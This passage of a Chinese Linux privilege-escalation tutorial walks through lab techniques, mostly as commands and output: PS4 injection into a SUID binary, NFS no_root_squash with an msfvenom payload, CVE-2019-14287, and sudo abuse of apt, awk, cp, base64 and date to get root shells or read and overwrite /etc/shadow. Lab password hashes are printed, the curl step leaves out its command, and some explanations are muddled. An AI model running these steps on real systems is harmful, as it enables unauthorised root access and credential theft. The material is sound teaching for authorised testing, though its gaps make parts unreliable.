'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1603) already running
.
```

解释一下这个命令。

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)' /usr/local/bin/suid-env2
```

- -i 参数表示 ignore environment，即忽略现有的环境变量
- xtrace 选项被设置，这将导致 shell 执行每个命令之前都打印该命令在做什么
- PS4 环境变量定义了打印输出的格式为一个命令序列，该序列先复制 /bin/bash 到 /tmp/rootbash2，然后设置 SUID 和可执行状态，在这个特定的命令序列中，xtrace 选项被用于触发 PS4 环境变量中的命令
- SHELLOPTS 是一个只读的 Bash 环境变量，用于列出当前已启用的 shell 选项。这个环境变量的值是一个以冒号分隔的列表，其中包含了当前已启用的 shell 选项的名字。例如启用了 strace 和 ignoreeof 选项则为 xtrace:ignoreeof。
- PS 代表 Prompt Strings。这是用于定义 shell 提示符的环境变量。例如，PS1 是主提示符，是命令行最常见的提示符，通常用于显示工作目录或用户名称等信息；PS2 是第二提示符，用于在需要额外输入时显示，例如在多行命令或 read 命令中。而 PS4 则是用于定义当 shell 以 xtrace 模式运行时的提示符。默认情况下 PS4 设置为 '+'，这就是为什么运行带 -x 参数的命令时会有 '+' 符号，在这个命令中每次 xtrace 在打印命令前会执行我们给出的恶意代码来尝试获得 shell

可以看到已经复制成功了。

```bash
user@RedteamNotes:~$ ls -liah /tmp
total 2.0M
1158721 drwxrwxrwt  4 root root 4.0K Jan 16 04:15 .
      2 drwxr-xr-x 21 root root 4.0K Apr 22  2023 ..
1158728 -rw-r--r--  1 root root 127K Jan 16 04:15 backup.tar.gz
1158724 drwxrwxrwt  2 root root 4.0K Jan 16 03:31 .ICE-unix
1158725 -rwsr-sr-x  1 root root 905K Jan 16 04:05 rootbash2
1158727 -rwsr-sr-x  1 root root 905K Jan 16 04:15 rootBash2
1158723 drwxrwxrwt  2 root root 4.0K Jan 16 03:31 .X11-unix
user@RedteamNotes:~$ /tmp/rootbash2
user@RedteamNotes:~$ /tmp/rootbash2 -p
rootbash2-4.1# whoami
root
```

### 密码和密钥历史文件提权

查看历史记录有没有明文密码泄露。

```bash
user@RedteamNotes:~$ cat ~/.*history | grep 'root'
mysql -h somehost.local -uroot -ppassword123
su root
```

发现密码尝试登入。

```bash
user@RedteamNotes:~$ su root
Password: 
root@RedteamNotes:/home/user# whoami
root
```

### 密码和密钥配置文件查看提权

查看家目录下的文件。

```bash
user@RedteamNotes:~$ pwd
/home/user
user@RedteamNotes:~$ ls -liah
total 76K
155042 drwxr-xr-x 5 user user 4.0K Jan 16 03:47 .
155041 drwxr-xr-x 3 root root 4.0K May 15  2017 ..
155075 -rwxr-xr-x 1 user user  638 Jan 15 10:42 39535.sh
155046 -rw------- 1 user user 2.4K Jan 16 04:16 .bash_history
155045 -rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
155043 -rw-r--r-- 1 user user 3.2K May 14  2017 .bashrc
155071 -rw-r--r-- 1 user user    0 Jan 15 10:22 --checkpoint=1
155074 -rw-r--r-- 1 user user    0 Jan 15 10:23 --checkpoint-action=exec=shell.elf
155076 drwxr-xr-x 2 user user 4.0K Jan 15 11:03 .config
375363 drwxr-xr-x 2 user user 4.0K May 13  2017 .irssi
156485 -rw------- 1 user user  137 May 15  2017 .lesshst
155047 -rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
155048 -rw------- 1 user user   11 May 15  2017 .nano_history
155072 -rwsr-sr-x 1 user user   66 Jan 15 10:04 overwrite.sh
155044 -rw-r--r-- 1 user user  725 May 13  2017 .profile
155077 -rwxr-xr-x 1 user user 6.7K Jan 16 03:47 service
155082 -rw-r--r-- 1 user user  105 Jan 16 03:47 service.c
155063 -rwsr-sr-x 1 user user  194 Jan 15 10:18 shell.elf
155049 drwxr-xr-x 8 user user 4.0K May 15  2017 tools
155083 -rw------- 1 user user 4.0K Jan 16 03:47 .viminfo
```

发现 `myvpn.ovpn` 很可疑，查看详细情况。

```bash
user@RedteamNotes:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
```

发现认证密码凭据存放在 `/etc/openvpn/auth.txt` 中，查看详细信息。

```bash
user@RedteamNotes:~$ cat /etc/openvpn/auth.txt
root
password123
```

切换为 root。

```bash
user@RedteamNotes:~$ su root
Password: 
root@RedteamNotes:/home/user# whoami
root
```

### SSH 密钥敏感信息提取

此内容仅有文字参考，实战内容后续有机会则补齐。

查看根目录发现有 .ssh 文件夹。

```sh
ls -liah /
```

查看 .ssh 的内容发现有 root_kty。

```bash
user@debian:~$ ls -liah /.ssh
 total 12K 
 1175041 drwxr-xr-x 
	2 root root 4.0K Aug 25 2019 .
	2 drwxr-xr-x 22 root root 4.0K Aug 25 2019 .. 
	1175042 -rw-r--r-- 1 root root 1.7K Aug 25 2019 root_key
```

查看 root_key。

```bash
cat /.ssh/root_kty
-----BEGIN RSA PRIVATE KEY-----

...

...

-----END RSA PRIVATE KEY-----
```

在 kali 中使用 id_rsa 进行登入。

```bash
┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
└─$ vim id_rsa 
┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
└─$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----

...

...

-----END RSA PRIVATE KEY-----
┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
└─$ sudo chmod 600 id_rsa 
┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
└─$ ls -liah id_rsa 
922104 -rw------- 1 kali kali 1.7K May 15 03:15 id_rsa 
┌──(kali㉿kali)-[~/Musics/PrivEscaLabs] 
└─$ ssh -i id_rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa
...
...
```

相关的备用搜索命令。

```bash
find / -name authorized_keys 2>/dev/null
```

```bash
find / -name id_rsa 2>/dev/null
```

### NFS 提权

查看 `/etc/export` 文件。

```bash
user@RedteamNotes:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

`no_root_squash` 是 NFS（Network File System）共享设置中的一个选项。它的作用是允许 root 用户在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。

默认情况下，NFS 使用 `root_squash` 选项，这意味着在 NFS 客户端上，root 用户的所有请求都被映射为一个匿名用户（通常是 `nobody` 或 `nfsnobody` ），这样可以防止客户端的 root 用户在 NFS 共享上进行任意操作。

然而如果设置了 `no_root_squash` 选项，在 NFS 客户端上的用户就可以像在本地文件系统上一样，拥有对 NFS 共享的完全控制权限。这在某些情况下可能是必要的，但也可能引入安全风险，因为任何可以在客户端获取 root 权限的用户都可以在 NFS 共享上进行任意操作。

`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)` 的意思为：所有主机都能访问 `/tmp` 目录，并且它们可以进行读写（rw），所有的写操作立即生效（sync），允许使用非保留端口链接（insecure），不希望将 root 用户映照为 匿名用户（no_root_squash），并且不希望进行子树检查（no_subtree_check）。

在 kali 中执行下面操作。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo su                    
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali/Work/Kali]
└─# mkdir /tmp/nfs
                                                                                                       
┌──(root㉿kali)-[/home/kali/Work/Kali]
└─# mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
                                                                                                       
┌──(root㉿kali)-[/home/kali/Work/Kali]
└─# cd /tmp/nfs  
┌──(root㉿kali)-[/tmp/nfs]
└─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell1.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Saved as: /tmp/nfs/shell1.elf
                                                                                                       
┌──(root㉿kali)-[/tmp/nfs]
└─# ls -liah shell1.elf                                                        
1158726 -rw-r--r-- 1 root root 132 Jan 16 07:46 shell1.elf
                                                                                                       
┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +xs shell1.elf
```

在靶机中执行下面操作。

```bash
user@RedteamNotes:~$ ls -liah /tmp/shell1.elf 
1158726 -rwsr-sr-x 1 root root 132 Jan 16 07:46 /tmp/shell1.elf
user@RedteamNotes:~$ /tmp/shell1.elf
bash-4.1# whoami
root
```

因为我们在 kali 中是 root，所以执行的命令映射到靶机中也是 root，以 root 身份执行了 `/bin/bash -p` 获得 root 权限。

### 内核提权

可以参考我的文章 [Lampiao Writeup](https://enilmalus.github.io/posts/lampiao-writeup/)。

Linux 内核负责管理系统内存和应用程序等组件之间的通信。这个关键功能要求内核具有特定权限；因此，成功的漏洞利用可能会导致获得 root 权限。内核漏洞利用方法很简单：

1. 确定内核版本
2. 为目标系统的内核版本搜索并找到一个漏洞利用代码
3. 运用漏洞利用

注意，失败的内核漏洞利用可能会导致系统崩溃。在尝试内核漏洞利用之前，请确保这种潜在的结果在渗透测试范围内是可接受的。内核漏洞利用往往是攻击者采取的最后一步，因为有时它们更容易被发现引起蓝队的警觉。

内核版本确定后可以通过 `github`、`searchsploit`、`Google` 搜索公开漏洞利用代码。

一些技巧和经验：

1. 使用 `cat /proc/version` 或 `uname -a` 获得内核版本后，在搜索利用是不必过于具体地指定内核版本，宽严并用。
2. 使用漏洞利用代码之前确保了解其工作原理，一些漏洞利用代码可能会在操作系统上进行更改，导致进一步使用中变得不安全，或者对系统进行不可逆地更改，从而在后期产生问题。
3. 一些漏洞利用可能在运行后需要进一步互动。要阅读漏洞利用代码、附带地说明和社区评论。

### doas less+vi 提权

查看具有 s 位的可执行文件发现有 `/usr/bin/doas`，查看他的配置文件。

```bash
Enilmalus$ find / -perm -u=s -type f 2>/dev/null /usr/bin/chfn 
/usr/bin/chpass 
/usr/bin/chsh 
/usr/bin/doas 
/usr/bin/lpr 
/usr/bin/lprm 
/usr/bin/passwd 
/usr/bin/su 
/usr/libexec/lockspool 
/usr/libexec/ssh-keysign 
/usr/sbin/authpf 
/usr/sbin/authpf-noip 
/usr/sbin/pppd 
/usr/sbin/traceroute 
/usr/sbin/traceroute6 
/sbin/ping 
/sbin/ping6 
/sbin/shutdown
Enilmalus$ cat /etc/doas.conf 
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog 
permit nopass keepenv root as root
```

根据提示执行。

```bash
doas /usr/bin/less /var/log/authlog
```

在 less 中按 v 启动 vi 编辑状态，然后执行：

```sh
:!sh
```

获得 root。

```bash
Enilmalus# whoami 
root
```

OpenBSD 是一个基于 Berkeley Software Distribution（BSD）的开源操作系统，强调正确性、简单性和安全性。这个系统中的 doas 是一个命令行工具，设计用来提供超级用户权限。doas 的配置文件默认位 /etc/doas.conf。此配置规定了哪些用户可以使用 doas 命令以及它们可执行的命令范围。

下面为 doas.conf 可能的文件条目：

```bash
permit keepenv :wheel
```

这个条目允许 wheel 的所哟成员使用 doas 命令执行任何操作并保留他们的环境变量。

doas.conf 文件的每一行代表一个规则，这些规则按照文件中的顺序进行处理。一旦找到一个匹配的规则则会停止搜索，使用具有最大限制的规则通常会放在文件顶部。例如：

```sh
permit nopass enil as root cmd reboot
```

这个规则允许用户 enil 不需要密码作为 root 用户允许 reboot 命令。

### CVE-2019-14287

CVE-2019-14287 是一种在 Unix Sudo 程序中发现的漏洞，由苹果公司的一位研究员 Joe Vennix 发现。

sudo 允许以其他用户身份执行程序。通常默认为 root，但可以通过指定用户名和 UID，也可以以其他用户身份执行程序。例如，通常可以这样使用 `sudo <command>`，但可以手动选择以其他用户执行，例如：`sudo -u#<id> <command>`。这意味着执行选定的命令时可以伪装为另一个用户，这可能可以获得比原本拥有更高的权限。

这个漏洞影响了 sudo 版本在 1.8.28 的系统，这个漏洞在 1.8.28p1 版本中被修复。

查看 sudo 权限以及 sudo 版本。

```bash
user@RedteamNotes:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/rvim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
    (root) NOPASSWD: /usr/sbin/tcpdump
    (root) NOPASSWD: /usr/bin/exiftool
    (ALL, !root) NOPASSWD: /bin/bash
user@RedteamNotes:~$ sudo -V
Sudo version 1.7.4p4
```

发现 sudo 版本小于 1.8.28，直接利用。

```bash
user@RedteamNotes:~$ sudo -u#-1 /bin/bash
root@RedteamNotes:/home/user# whoami
root
```

下面是一些解释。

```bash
(ALL, !root) NOPASSWD: /bin/bash
```

这将允许用户以另一个用户的身份执行任何命令，但理论上会阻止以超级用户的身份执行命令。如果指定 UID 为 -1，sudo 则会错误的将其读取为 0。这意味着指定 UID 为 -1 或 4294967295 时将以 sudo 身份执行命令。

### sudo apt

从此条开始下面数个提权演示命令参考 [GTFOBins](https://gtfobins.github.io)

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/apt
```

发现可以无需密码执行 `/usr/bin/apt` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
root@RedteamNotes:/tmp# whoami
root
```

解释一下命令。

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
```

这是一个 apt 命令的选项，用于设置在运行 apt update 之前执行的预处理脚本。`::` 类似于名字空间，逐级访问子配置。

### sudo apache2

查看无需密码即可以 sudo 身份执行的命令。

```bash
user@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User user may run the following commands on localhost:
    (root) NOPASSWD: /usr/sbin/apache2
```

发现可以无需密码执行 `/usr/sbin/apache2` 命令，使用该命令读取 `/etc/shadow` 文件。

```bash
user@RedteamNotes:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$1jXHC49QenfimFS4$ncBkl6H.3JA9N2ZoTHCpu4g68lTPlX0RFYiFEkHA8I3.AgWcKiL0mtrUiC5Ue87TP8eIEWDe/Dij4hP5gb/Gm0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

可以看到获取了 root 的 shadow 文件，后续可参考本文章前段的可读 shadow 文件提权演示。

一些应用程序可能没有已知漏洞，比如最新的 Apache2 服务器程序，常规功能不能被巧用。但 Apache2 帮助信息提示它有一个支持加载替代配置文件的选项 -f，指定代替 ServerConfigFile，指定此选项加载 /etc/shadow 文件将产生一条此错误信息，包含 /etc/shadow 文件的第一行数据。

### sudo ash

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/ash
```

发现可以无需密码执行 `/usr/bin/ash` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo /usr/bin/ash
# whoami
root
```

ash 是 Bourne shell（sh）的一个轻量级版本，它消耗的系统资源更少，通常用于嵌入式系统和资源有限的环境。

不管什么 shell，只要是 shell 的直接以 sudo 执行肯定可以提权。

### sudo awk

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/awk
```

发现可以无需密码执行 `/usr/bin/awk` 命令，运行提权命令。

```bash
jackie@RedteamNotes:~$ sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
root@RedteamNotes:/home/jackie# whoami
root
```


下面是一些解释。

```bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

`'BEGIN {system("/bin/bash")}` 是 `awk` 的语法，是传递给 awk 的脚本。`BEGIN` 是 `awk` 的一个特殊模式，表示在处理任何输入行之前执行的动作。在这个命令中，`BEGIN` 块的唯一动作是调用 `system` 函数。`system` 函数用于在 `awk` 内部执行 `shell` 命令，启动一个新的 `bash` 会话。

### sudo base64

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/base64
```

发现可以无需密码执行 `/usr/bin/base64` 命令，运行命令查看 shadow 文件。

```bash
jackie@RedteamNotes:~$ sudo /usr/bin/base64 /etc/shadow | base64 --decode
root:$y$j9T$a.ipD.LiSZYLHLRH7lSKk.$zxqmHjNW491.v7cru/aqsM6HRRaZElH43FW0EuNyqjC:20470:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19467:0:99999:7:::
jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::
lxd:!:19467::::::
jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::
mysql:!:19494:0:99999:7:::
```

后续可参考本文章前段的可读 shadow 文件提权演示。

`base32`、`base58`、`basenc`、`basez` 等都可以用相同的方法查看文件。

### sudo bash

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/bash
```

发现可以无需密码执行 `/usr/bin/bash` 命令，直接执行 `bash` 获得 `root`。

```bash
jackie@RedteamNotes:~$ sudo /bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

包括之前演示的 `ash` 与这个 `bash`，下面这些几乎都可以用相同的语法实现提权，因为它们本身就是 `shell`。

- /usr/bin/csh
- /usr/bin/dash
- /usr/bin/sh
- /usr/bin/tclsh
- /usr/bin/zsh
- ...

### sudo cp

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/cp
```

发现可以无需密码执行 `/usr/bin/cp` 命令，可以使用 `cp` 命令修改 `root` 密码。

注意，这么会损伤服务器，谨慎考虑后再执行下一步。

在 kali 中制作要替换的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ mkpasswd -m sha-512 enilmalus
$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0
```

在靶机中：

```bash
jackie@RedteamNotes:~$ Enilmalus=/etc/shadow
jackie@RedteamNotes:~$ TF=$(mktemp)
jackie@RedteamNotes:~$ echo 'root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:19495:0:99999:7:::' > $TF
jackie@RedteamNotes:~$ echo $TF
/tmp/tmp.xQTrcAWIQr
jackie@RedteamNotes:~$ cat /tmp/tmp.xQTrcAWIQr
root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:19495:0:99999:7:::
jackie@RedteamNotes:~$ sudo cp $TF $Enilmalus
```

使用制作的密码登入。

```bash
jackie@RedteamNotes:~$ su root
Password: 
root@RedteamNotes:/home/jackie# whoami
root
```

`TF=$(mktemp)` 做临时文件赋值给 TF，这种做临时文件的方式是专业做法，是最佳实践，从安全和边界角度考虑的，TF 可以根据需要自主命名。

### sudo cpulimit

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/cpulimit
```

发现可以无需密码执行 `/usr/bin/cpulimit` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo cpulimit -l 100 -f /bin/bash
Process 3022 detected
root@RedteamNotes:/home/jackie# whoami
root
```

`cpulimit` 是一个工具，用于限制进程的 CPU 使用率。 `-l` 参数后面跟的是百分比，这里的 `100` 意味着限制 `CPU` 的使用率为 100%。

`-f` 参数指定需要限制 `CPU` 使用率的命令或程序，指定为 `/bin/bash`。

这个命令以 sudo 权限限制 `/bin/bash` 命令的 `CPU` 使用率不超过 100%。随后按这个标准启动进程，所以获得了提权。

### sudo curl

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/curl
```

发现可以无需密码执行 `/usr/bin/curl` 命令，可以使用 `curl` 写入文件。

注意，这种方式提权可能会损伤服务器，请深思熟虑后再进行。

在 kali 中制作要替换的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ mkpasswd -m sha-512 enilmalus
$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim shadow1
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat shadow1 
root:$6$nQHYWwH9eo7g6qhZ$DsS9e3.NKKTbljgMeZpwApqCsEjpKazz/cXmfGKiB17z3pTO/FumI3iXLER1gi3OW7HV7oq0SLhcVb7jqJQm.0:17298:0:99999:7:::
```

启动简易服务器。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo php -S 0:80
[sudo] password for kali: 
[Sat Jan 17 05:56:03 2026] PHP 8.4.8 Development Server (http://0:80) started
[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 Accepted
[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 [200]: GET /shadow1
[Sat Jan 17 05:57:53 2026] 10.10.10.68:34332 Closing

```

在把靶机中实现提权。

```bash
jackie@RedteamNotes:~$ su root
Password: 
root@RedteamNotes:/home/jackie# whoami
root
```

### sudo date

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/date
```

发现可以无需密码执行 `/usr/bin/date` 命令，使用 `date` 查看 `/etc/shadow` 文件。

```bash
jackie@RedteamNotes:~$ sudo date -f /etc/shadow
date: invalid date ‘root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::’
date: invalid date ‘daemon:*:19405:0:99999:7:::’
date: invalid date ‘bin:*:19405:0:99999:7:::’
date: invalid date ‘sys:*:19405:0:99999:7:::’
date: invalid date ‘sync:*:19405:0:99999:7:::’
date: invalid date ‘games:*:19405:0:99999:7:::’
date: invalid date ‘man:*:19405:0:99999:7:::’
date: invalid date ‘lp:*:19405:0:99999:7:::’
date: invalid date ‘mail:*:19405:0:99999:7:::’
date: invalid date ‘news:*:19405:0:99999:7:::’
date: invalid date ‘uucp:*:19405:0:99999:7:::’
date: invalid date ‘proxy:*:19405:0:99999:7:::’
date: invalid date ‘www-data:*:19405:0:99999:7:::’
date: invalid date ‘backup:*:19405:0:99999:7:::’
date: invalid date ‘list:*:19405:0:99999:7:::’
date: invalid date ‘irc:*:19405:0:99999:7:::’
date: invalid date ‘gnats:*:19405:0:99999:7:::’
date: invalid date ‘nobody:*:19405:0:99999:7:::’
date: invalid date ‘_apt:*:19405:0:99999:7:::’
date: invalid date ‘systemd-network:*:19405:0:99999:7:::’
date: invalid date ‘systemd-resolve:*:19405:0:99999:7:::’
date: invalid date ‘messagebus:*:19405:0:99999:7:::’
date: invalid date ‘systemd-timesync:*:19405:0:99999:7:::’
date: invalid date ‘pollinate:*:19405:0:99999:7:::’
date: invalid date ‘sshd:*:19405:0:99999:7:::’
date: invalid date ‘syslog:*:19405:0:99999:7:::’
date: invalid date ‘uuidd:*:19405:0:99999:7:::’
date: invalid date ‘tcpdump:*:19405:0:99999:7:::’
date: invalid date ‘tss:*:19405:0:99999:7:::’
date: invalid date ‘landscape:*:19405:0:99999:7:::’
date: invalid date ‘fwupd-refresh:*:19405:0:99999:7:::’
date: invalid date ‘usbmux:*:19467:0:99999:7:::’
date: invalid date ‘jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::’
date: invalid date ‘lxd:!:19467::::::’
date: invalid date ‘jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::’
date: invalid date ‘mysql:!:19494:0:99999:7:::’
```

后续可参考本文章前段的可读 shadow 文件提权演示。

`-f` 参数允许 `date` 从给定的文件中读取日期和时间。这个文件应包含一行或多行日期和时间信息。虽然报错 `/etc/shadow` 文件却被显示出来。

### sudo dstat

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
